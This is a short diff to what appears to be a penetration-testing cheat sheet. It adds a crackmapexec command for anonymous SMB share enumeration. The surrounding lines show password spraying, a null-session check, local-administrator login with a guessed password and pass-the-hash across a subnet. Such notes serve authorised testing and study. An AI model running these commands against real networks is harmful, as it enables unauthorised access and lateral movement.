@@ -1408,6 +1408,7 @@ net accounts /domain               (grab the lockout policy in effect)
 
 crackmapexec smb 192.168.55.44 -u users.txt -p test123 -d domain.local --continue-on-success
 crackmapexec smb 192.168.45.44 -u "" -p ""
+crackmapexec smb reporting/external.txt -u "anonymous" -p "" --shares
 crackmapexec smb 192.168.45.44 -u Administrator -p Password1# --local-auth
 crackmapexec smb 192.168.45.0/24 -u Administrator -H LM:NT --local-auth
 crackmapexec smb 192.168.45.0/24 -u Administrator -H NT
